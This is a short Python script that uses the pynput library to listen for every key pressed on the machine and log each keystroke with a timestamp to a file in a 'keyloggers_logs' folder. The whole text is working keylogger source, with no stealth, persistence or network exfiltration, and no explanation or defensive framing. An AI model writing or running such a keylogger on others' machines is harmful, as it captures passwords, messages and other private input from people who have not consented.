from pynput import keyboard    # To listen to keyboard events
import logging               # To log the keystrokes
import os                   # To create a file path

# Create directory for storing logs
log_dir = "keyloggers_logs"
if not os.path.exists(log_dir):
    os.mkdir(log_dir)

logging.basicConfig(
    filename = os.path.join(log_dir, "keylog.txt"),
    level = logging.DEBUG,
    format = "%(asctime)s: %(message)s"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

with keyboard.Listener(on_press = on_press) as listener:
    listener.join()